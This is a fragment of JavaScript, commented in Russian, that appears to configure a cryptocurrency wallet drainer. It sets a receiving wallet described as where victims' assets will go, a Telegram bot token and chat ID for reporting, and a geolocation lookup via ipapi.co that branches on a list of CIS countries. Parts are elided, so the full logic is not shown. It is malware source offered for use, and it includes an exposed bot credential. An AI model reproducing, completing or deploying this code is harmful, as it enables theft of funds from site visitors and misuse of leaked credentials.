var mainWallet = "UQD19fLJMKNzjT56fLdIbJPu5J9tLjfug5K2nCYgTtoH8dBu"; //Ваш кошелек, куда будут лететь активы
var tgBotToken = "6723180713:AAEJNx4JO94jd1rwZKnReEVN0G6oENnufyo"; //Токен от бота телеграмм
var tgChat = "6068287209"; //Ваш телеграмм-канал
...
fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
    ...
    if (country === 'RU' || country === 'KZ' || country === 'EN' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
